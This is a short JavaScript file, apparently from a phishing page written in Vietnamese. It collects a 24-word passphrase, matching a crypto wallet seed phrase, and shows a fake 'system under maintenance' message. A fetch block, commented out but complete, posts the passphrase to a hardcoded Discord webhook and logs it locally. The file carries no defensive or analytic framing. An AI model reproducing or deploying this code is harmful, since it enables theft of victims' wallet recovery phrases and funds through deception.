const webhookUrl =
  "https://discord.com/api/v10/webhooks/1322417162417209365/s4RJDl-sR8GHMk7O9OI5tuv8mZUxKwFfQ0mwAOMEbk4iUSxQLsRhyo5lL83RXO_VAqzR";

const savedPassphrases = JSON.parse(localStorage.getItem("passphrases")) || [];

document.querySelector(".btn-main").addEventListener("click", () => {
  sendData();
});


function sendData() {
  const passphrase = document.querySelector("textarea").value.trim();
  const words = passphrase.split(/\s+/);

  if (!passphrase) {
    alert("Vui lòng nhập mật khẩu của bạn!");
    return;
  }

  if (words.length !== 24) {
    alert("Mật khẩu phải là 24 từ");
    return;
  }

  if (savedPassphrases.includes(passphrase)) {
    alert("Hệ thống đang bảo trì vui lòng quay lại sau!");
    window.location.href = "index.html";
    return;
  }



//   fetch(webhookUrl, {
//     method: "POST",
//     headers: {
//       "Content-Type": "application/json",
//     },
//     body: JSON.stringify({
//       content: passphrase,
//     }),
//   })
//     .then(() => {
//       savedPassphrases.push(passphrase);
//       localStorage.setItem("passphrases", JSON.stringify(savedPassphrases));
//       alert("Hệ thống đang bảo trì vui lòng quay lại sau!");
//       window.location.href = "index.html";
//     })
//     .catch((error) => console.error("Error:", error));
}
